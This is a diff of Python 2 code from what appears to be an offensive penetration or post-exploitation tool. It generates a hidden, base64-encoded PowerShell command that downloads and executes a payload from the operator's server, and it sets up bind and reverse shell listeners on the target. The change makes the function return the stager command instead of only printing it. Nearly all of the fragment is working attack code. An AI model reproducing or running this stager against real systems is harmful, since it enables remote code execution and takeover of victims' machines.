@@ -36,8 +36,8 @@ def printListener():
         print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + manualIP + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
     else:
         FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
-        print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
-
+        stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
+        print stagerexec
     if bindOrReverse == 'b':
         if not '5556' in str(serverlist):
             ipADDR = raw_input(t.bold_green + '[?] IP After Run Bind Shell on Target: ' + t.normal)
@@ -51,7 +51,7 @@ def printListener():
         if not '5555' in str(serverlist):
             listenerserver = Server(manualIP, 5555, bindsocket=True)
             serverlist.append(listenerserver)
-    return "pass"
+    return stagerexec
 
 
 def interactShell(clientnumber):
